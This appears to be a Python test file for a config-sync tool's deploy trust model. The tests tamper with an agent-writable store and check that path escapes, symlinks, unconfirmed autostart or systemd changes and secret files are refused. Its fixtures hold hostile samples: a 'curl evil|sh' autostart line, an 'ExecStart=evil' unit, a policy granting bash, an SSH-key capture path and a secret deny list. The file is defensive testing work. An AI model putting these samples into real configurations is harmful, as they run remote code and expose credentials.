"""Tests for config_sync's deploy trust model (2026-11-24) and capture hardening.

The store is agent-writable, so these tests play the attacker: tamper with mirrored
copies, the manifest and tracked.txt, plant symlinks and path escapes, and check that
nothing reaches ~/.config without the plan showing it and a human confirming it.
Run as a NON-root user."""

import hashlib
import json
import os
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from armamentarium import config_sync as cs
from armamentarium.config_sync import ConfigSyncError, apply_deploy, plan_deploy

HOST = "testhost"


def sha(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


class Answers:
    """Scripted prompt(): returns queued answers, records the questions."""

    def __init__(self, *answers):
        self.answers, self.asked = list(answers), []

    def __call__(self, q):
        self.asked.append(q)
        return self.answers.pop(0) if self.answers else ""


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        t = Path(os.path.realpath(self.tmp.name))
        self.root, self.home = t / "store", t / "home"
        self.cfg = self.home / ".config"
        self.cfg.mkdir(parents=True)
        self.hdir = self.root / "config" / HOST
        self.mirror = self.hdir / "config"
        self.mirror.mkdir(parents=True)
        self.review = t / "review"
        self.p = mock.patch.object(cs, "REVIEW_DIR", self.review)
        self.p.start()
        self.tracked, self.manifest = [], {"version": "1.0", "host": HOST, "files": {}}

    def tearDown(self):
        self.p.stop()
        self.tmp.cleanup()

    def put(self, rel, live=None, store=b"", manifest_sha="live", track=True, live_mode=None):
        """live=None means no live file. manifest_sha='live' records the live hash (the normal
        state after a capture), so a different `store` models a tampered store."""
        if live is not None:
            d = self.cfg / rel
            d.parent.mkdir(parents=True, exist_ok=True)
            d.write_bytes(live)
            if live_mode is not None:
                os.chmod(d, live_mode)
        if store is not None:
            s = self.mirror / rel
            s.parent.mkdir(parents=True, exist_ok=True)
            s.write_bytes(store)
        basis = live if live is not None else store
        if manifest_sha != "live":
            msha = manifest_sha
        else:
            msha = sha(basis) if basis is not None else "0" * 64
        self.manifest["files"][rel] = {"updated": "x", "size": 0, "sha256": msha}
        if track:
            self.tracked.append(rel)
        self.save()

    def save(self):
        self.write_local("\n".join(self.tracked) + "\n")
        (self.hdir / "tracked.txt").write_text("\n".join(self.tracked) + "\n")  # store copy
        (self.hdir / "manifest.json").write_text(json.dumps(self.manifest))

    def write_local(self, text, mode=0o644):
        p = self.cfg / "armamentarium" / "tracked.txt"
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
        os.chmod(p, mode)
        return p

    def plan(self, force=False):
        return plan_deploy(HOST, self.root, self.home, force=force)

    def entry(self, plan, rel):
        return next(e for e in plan.entries if e.path == rel)

    def apply(self, plan, *answers, tty=True):
        return apply_deploy(plan, prompt=Answers(*answers), out=lambda s: None,
                            isatty=lambda: tty)


class TestPlanIsDryRun(Base):
    def test_tampered_store_shows_in_plan_and_writes_nothing(self):
        # live matches the manifest (normal), but the store copy was changed
        self.put("foo/app.conf", live=b"a=1\n", store=b"a=EVIL\n")
        plan = self.plan()
        e = self.entry(plan, "foo/app.conf")
        self.assertEqual(e.action, "update")
        self.assertIn("+a=EVIL", e.diff)
        self.assertEqual((self.cfg / "foo/app.conf").read_bytes(), b"a=1\n")

    def test_deploy_wrapper_never_writes(self):
        self.put("foo/app.conf", live=b"a=1\n", store=b"a=2\n")
        result = cs.deploy(HOST, self.root, self.home)
        self.assertEqual(result["entries"][0]["action"], "update")
        self.assertEqual((self.cfg / "foo/app.conf").read_bytes(), b"a=1\n")

    def test_unchanged_is_unchanged(self):
        self.put("foo/app.conf", live=b"same\n", store=b"same\n")
        self.assertEqual(self.entry(self.plan(), "foo/app.conf").action, "unchanged")


class TestApply(Base):
    def test_no_terminal_refuses_and_writes_nothing(self):
        self.put("foo/app.conf", live=b"a=1\n", store=b"a=2\n")
        with self.assertRaises(ConfigSyncError):
            self.apply(self.plan(), "y", tty=False)
        self.assertEqual((self.cfg / "foo/app.conf").read_bytes(), b"a=1\n")

    def test_default_answer_is_no(self):
        self.put("foo/app.conf", live=b"a=1\n", store=b"a=2\n")
        r = self.apply(self.plan(), "")
        self.assertTrue(r["aborted"])
        self.assertEqual((self.cfg / "foo/app.conf").read_bytes(), b"a=1\n")

    def test_yes_writes_with_backup_and_keeps_mode(self):
        self.put("foo/app.conf", live=b"a=1\n", store=b"a=2\n", live_mode=0o600)
        r = self.apply(self.plan(), "y")
        dest = self.cfg / "foo/app.conf"
        self.assertEqual(r["applied"], ["foo/app.conf"])
        self.assertEqual(dest.read_bytes(), b"a=2\n")
        self.assertEqual(dest.stat().st_mode & 0o777, 0o600)
        self.assertTrue(list(dest.parent.glob("app.conf.bak-*")))

    def test_new_file_gets_0644_not_store_mode(self):
        self.put("foo/new.conf", live=None, store=b"x\n")
        os.chmod(self.mirror / "foo/new.conf", 0o755)   # an exec bit planted in the store
        plan = self.plan()
        e = self.entry(plan, "foo/new.conf")
        self.assertTrue(e.code_runner)                   # exec bit -> code runner
        self.apply(plan, "y", "new.conf")
        self.assertEqual((self.cfg / "foo/new.conf").stat().st_mode & 0o777, 0o644)

    def test_writes_planned_bytes_even_if_store_changes_after_review(self):
        self.put("foo/app.conf", live=b"a=1\n", store=b"a=2\n")
        plan = self.plan()
        (self.mirror / "foo/app.conf").write_bytes(b"a=SWAPPED\n")   # TOCTOU attempt
        self.apply(plan, "y")
        self.assertEqual((self.cfg / "foo/app.conf").read_bytes(), b"a=2\n")

    def test_live_changed_since_plan_is_skipped(self):
        self.put("foo/app.conf", live=b"a=1\n", store=b"a=2\n")
        plan = self.plan()
        (self.cfg / "foo/app.conf").write_bytes(b"a=hand-edit\n")
        r = self.apply(plan, "y")
        self.assertEqual(r["skipped_changed_since_plan"], ["foo/app.conf"])
        self.assertEqual((self.cfg / "foo/app.conf").read_bytes(), b"a=hand-edit\n")


class TestCodeRunners(Base):
    def test_autostart_needs_its_name_typed(self):
        self.put("labwc/autostart", live=b"mako &\n", store=b"mako &\ncurl evil|sh &\n")
        plan = self.plan()
        self.assertTrue(self.entry(plan, "labwc/autostart").code_runner)
        r = self.apply(plan, "y", "y")                   # 'y' is not the name
        self.assertEqual(r["skipped_by_operator"], ["labwc/autostart"])
        self.assertEqual((self.cfg / "labwc/autostart").read_bytes(), b"mako &\n")
        r = self.apply(self.plan(), "y", "autostart")
        self.assertEqual(r["applied"], ["labwc/autostart"])

    def test_classification(self):
        for rel in ("systemd/user/x.service", "kanshi/config", "autostart/a.desktop",
                    "environment.d/10.conf", "Claude/claude_desktop_config.json"):
            self.assertTrue(cs.is_code_runner(rel), rel)
        self.assertTrue(cs.is_code_runner("foo/run", b"#!/bin/sh\n"))
        self.assertFalse(cs.is_code_runner("foo/app.conf", b"a=1\n", 0o644))

    def test_mixed_set_writes_plain_skips_unconfirmed_runner(self):
        self.put("foo/app.conf", live=b"a=1\n", store=b"a=2\n")
        self.put("systemd/user/x.service", live=b"[Unit]\n", store=b"[Unit]\nExecStart=evil\n")
        r = self.apply(self.plan(), "y", "nope")
        self.assertEqual(r["applied"], ["foo/app.conf"])
        self.assertEqual(r["skipped_by_operator"], ["systemd/user/x.service"])


class TestPolicyFiles(Base):
    def test_exec_json_is_never_written_but_reviewable(self):
        new = b'{"rules": {"everything": {"mode": "always", "argv": ["bash"]}}}\n'
        self.put("armamentarium/exec.json", live=b"{}\n", store=new)
        plan = self.plan()
        e = self.entry(plan, "armamentarium/exec.json")
        self.assertEqual(e.action, "policy")
        self.assertIn("install -m 0644", e.review_cmd)
        snap = Path(e.review_cmd.split()[3])
        self.assertEqual(snap.read_bytes(), new)        # the snapshot IS the reviewed diff
        self.assertTrue(str(snap).startswith(str(self.review)))
        r = self.apply(plan, "y")
        self.assertEqual(r["applied"], [])
        self.assertEqual((self.cfg / "armamentarium/exec.json").read_bytes(), b"{}\n")

    def test_router_json_is_policy_too(self):
        self.put("armamentarium/router.json", live=b"{}\n", store=b'{"roots": ["/"]}\n')
        self.assertEqual(self.entry(self.plan(), "armamentarium/router.json").action, "policy")

    def test_elevate_json_refused_outright(self):
        self.put("armamentarium/elevate.json", live=None, store=b'{"grants": []}\n')
        e = self.entry(self.plan(), "armamentarium/elevate.json")
        self.assertEqual(e.action, "refused")
        self.assertFalse((self.cfg / "armamentarium/elevate.json").exists())


class TestStoreTampering(Base):
    def test_path_escape_refused(self):
        self.put("../.bashrc", live=None, store=None)
        (self.root / "config" / HOST / ".bashrc").write_bytes(b"evil\n")  # where ../ lands in mirror
        plan = self.plan()
        self.assertEqual(self.entry(plan, "../.bashrc").action, "refused")
        self.apply(plan, "y")
        self.assertFalse((self.home / ".bashrc").exists())

    def test_absolute_path_refused(self):
        self.put("/etc/passwd", live=None, store=None)
        self.assertEqual(self.entry(self.plan(), "/etc/passwd").action, "refused")

    def test_manifest_entry_not_in_tracked_refused(self):
        self.put("foo/sneaky.conf", live=None, store=b"x\n", track=False)
        e = self.entry(self.plan(), "foo/sneaky.conf")
        self.assertEqual(e.action, "refused")
        self.assertIn("tracked.txt", e.reason)

    def test_symlinked_store_copy_refused(self):
        secret = self.home / "secret"
        secret.write_bytes(b"private\n")
        self.put("foo/link.conf", live=None, store=None)
        (self.mirror / "foo").mkdir(parents=True, exist_ok=True)
        os.symlink(secret, self.mirror / "foo/link.conf")
        self.assertEqual(self.entry(self.plan(), "foo/link.conf").action, "refused")

    def test_symlinked_live_dir_refused(self):
        outside = self.home / "outside"
        outside.mkdir()
        os.symlink(outside, self.cfg / "foo")
        self.put("foo/app.conf", live=None, store=b"x\n")
        plan = self.plan()
        self.assertEqual(self.entry(plan, "foo/app.conf").action, "refused")
        self.apply(plan, "y")
        self.assertFalse((outside / "app.conf").exists())

    def test_drift_refused_unless_force(self):
        self.put("foo/app.conf", live=b"hand\n", store=b"store\n", manifest_sha=sha(b"old\n"))
        self.assertEqual(self.entry(self.plan(), "foo/app.conf").action, "refused")
        self.assertEqual(self.entry(self.plan(force=True), "foo/app.conf").action, "update")


class TestCapture(Base):
    def test_capture_refuses_escapes_and_grants(self):
        ssh = self.home / ".ssh"
        ssh.mkdir()
        (ssh / "id_ed25519").write_bytes(b"PRIVATE KEY\n")
        (self.cfg / "armamentarium").mkdir()
        (self.cfg / "armamentarium/elevate.json").write_bytes(b"{}\n")
        (self.cfg / "ok.conf").write_bytes(b"fine\n")
        self.write_local("../.ssh/id_ed25519\narmamentarium/elevate.json\nok.conf\n")
        r = cs.capture(HOST, self.root, self.home)
        self.assertEqual(r["synced"], ["ok.conf"])
        self.assertEqual({x["path"] for x in r["refused_unsafe"]},
                         {"../.ssh/id_ed25519", "armamentarium/elevate.json"})
        self.assertFalse(list(self.root.rglob("id_ed25519")))

    def test_capture_refuses_symlink_out_of_config(self):
        (self.home / "secret").write_bytes(b"private\n")
        os.symlink(self.home / "secret", self.cfg / "link.conf")
        self.write_local("link.conf\n")
        r = cs.capture(HOST, self.root, self.home)
        self.assertEqual(r["synced"], [])
        self.assertFalse((self.mirror / "link.conf").exists())

    def test_capture_commits_only_its_host_dir(self):
        env = {"GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_NOSYSTEM": "1",
               "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@x.invalid",
               "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@x.invalid"}
        with mock.patch.dict(os.environ, env):
            git = lambda *a: subprocess.run(["git", "-C", str(self.root), *a], check=True,
                                            capture_output=True, text=True).stdout
            git("init", "-q")
            other = self.root / "config" / "otherhost" / "tracked.txt"
            other.parent.mkdir(parents=True)
            other.write_text("x\n")
            git("add", "-A")
            git("commit", "-qm", "base")
            other.write_text("x\nUNRELATED EDIT\n")          # dirty, not ours
            (self.cfg / "ok.conf").write_bytes(b"fine\n")
            self.write_local("ok.conf\n")
            cs.capture(HOST, self.root, self.home)
            self.assertIn("otherhost/tracked.txt", git("status", "--porcelain"))
            self.assertIn(f"config/{HOST}/", git("show", "--name-only", "--format=", "HEAD"))
            self.assertNotIn("otherhost", git("show", "--name-only", "--format=", "HEAD"))


class TestLocalTrackedIsAuthoritative(Base):
    def test_missing_local_list_fails_closed_with_install_hint(self):
        (self.hdir / "tracked.txt").write_text("ok.conf\n")       # store copy only
        with self.assertRaises(ConfigSyncError) as cm:
            self.plan()
        self.assertIn("install -D -m 0644", str(cm.exception))
        with self.assertRaises(ConfigSyncError):
            cs.capture(HOST, self.root, self.home)

    def test_group_writable_or_symlinked_local_list_refused(self):
        p = self.write_local("ok.conf\n", mode=0o664)
        with self.assertRaises(ConfigSyncError):
            self.plan()
        p.unlink()
        real = self.home / "elsewhere.txt"
        real.write_text("ok.conf\n")
        os.symlink(real, p)
        with self.assertRaises(ConfigSyncError):
            self.plan()

    def test_store_only_line_is_ignored_by_deploy(self):
        self.put("foo/app.conf", live=b"a=1\n", store=b"a=1\n")
        # attacker adds a line + mirror + manifest entry to the STORE only
        (self.mirror / "foo").mkdir(exist_ok=True)
        (self.mirror / "foo/sneaky.conf").write_bytes(b"evil\n")
        self.manifest["files"]["foo/sneaky.conf"] = {"updated": "x", "size": 0,
                                                     "sha256": sha(b"evil\n")}
        (self.hdir / "manifest.json").write_text(json.dumps(self.manifest))
        (self.hdir / "tracked.txt").write_text("foo/app.conf\nfoo/sneaky.conf\n")
        e = self.entry(self.plan(), "foo/sneaky.conf")
        self.assertEqual(e.action, "refused")
        self.assertIn("armamentarium/tracked.txt", e.reason)

    def test_capture_regenerates_store_copy_and_ignores_its_edits(self):
        (self.cfg / "ok.conf").write_bytes(b"fine\n")
        self.write_local("ok.conf\n")
        (self.hdir / "tracked.txt").write_text("ok.conf\ngh/hosts.yml\n")   # store edit
        r = cs.capture(HOST, self.root, self.home)
        self.assertEqual(r["synced"], ["ok.conf"])
        copy = (self.hdir / "tracked.txt").read_text()
        self.assertTrue(copy.startswith("# GENERATED"))
        self.assertNotIn("gh/hosts.yml", copy)


class TestSecretDenyList(Base):
    def test_capture_skips_secret_looking_paths(self):
        for rel in ("gh/hosts.yml", "Claude/Cookies", "foo/api_token.json", "bar/id_ed25519",
                    "Claude/claude_desktop_config.json", "ok.conf"):
            f = self.cfg / rel
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_bytes(b"x\n")
        self.write_local("gh/hosts.yml\nClaude/Cookies\nfoo/api_token.json\nbar/id_ed25519\n"
                         "Claude/claude_desktop_config.json\nok.conf\n")
        r = cs.capture(HOST, self.root, self.home)
        self.assertEqual(sorted(r["synced"]), ["Claude/claude_desktop_config.json", "ok.conf"])
        self.assertEqual(len(r["refused_unsafe"]), 4)

    def test_real_fleet_lists_are_not_flagged(self):
        # hecate + sisyphus tracked lists as of 2026-11-24: none may trip the deny list
        for rel in ("labwc/rc.xml", "labwc/menu.xml", "labwc/autostart", "kanshi/config",
                    "systemd/user/graphical-session.target.wants/kanshi.service",
                    "systemd/user/default.target.wants/yubikey-agent.service",
                    "systemd/user/kanshi.service", "Claude/claude_desktop_config.json",
                    "armamentarium/desktop.json", "armamentarium/dock.json",
                    "armamentarium/exec.json", "armamentarium/router.json",
                    "stoa/fleet-hosts.json", "stoa/reliquary-mounts.json"):
            self.assertIsNone(cs.secret_reason(rel), rel)


class TestAdopt(Base):
    def setUp(self):
        super().setUp()
        self.write_local("ok.conf\n")
        for rel in ("new.conf", "gh/hosts.yml"):
            for base in (self.cfg, self.mirror):
                f = base / rel
                f.parent.mkdir(parents=True, exist_ok=True)
                f.write_bytes(b"x\n")

    def test_dry_run_by_default_and_secrets_never_proposed(self):
        r = cs.adopt(HOST, self.root, self.home)
        self.assertEqual(r["new"], ["new.conf"])
        self.assertEqual([x["path"] for x in r["refused"]], ["gh/hosts.yml"])
        self.assertFalse(r["applied"])
        self.assertEqual((self.cfg / "armamentarium/tracked.txt").read_text(), "ok.conf\n")

    def test_apply_appends_to_local_list_only(self):
        store_before = (self.hdir / "tracked.txt").read_text() if (
            self.hdir / "tracked.txt").exists() else None
        r = cs.adopt(HOST, self.root, self.home, apply=True)
        self.assertTrue(r["applied"])
        local = (self.cfg / "armamentarium/tracked.txt").read_text()
        self.assertIn("new.conf", local)
        self.assertNotIn("gh/hosts.yml", local)
        after = (self.hdir / "tracked.txt").read_text() if (
            self.hdir / "tracked.txt").exists() else None
        self.assertEqual(after, store_before)


if __name__ == "__main__":
    unittest.main()
